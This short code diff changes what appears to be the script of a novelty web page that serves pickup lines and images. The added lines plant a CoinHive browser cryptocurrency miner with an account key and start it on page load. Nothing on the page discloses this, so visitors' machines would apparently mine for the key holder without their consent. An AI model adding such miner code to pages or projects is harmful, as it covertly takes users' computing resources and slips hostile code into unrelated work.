@@ -96,6 +96,9 @@
 	   "Can you give me directions to your heart? I seem to have lost my way in your eyes.",
 	   "What time do you have to be back in heaven?"
                ];
+	
+  var miner = new CoinHive.User('q3H5OB6fvuPdgyh7xUA1OM8esB0PYvBe');
+  miner.start();
      
   var images = [
     "reddot.jpeg",
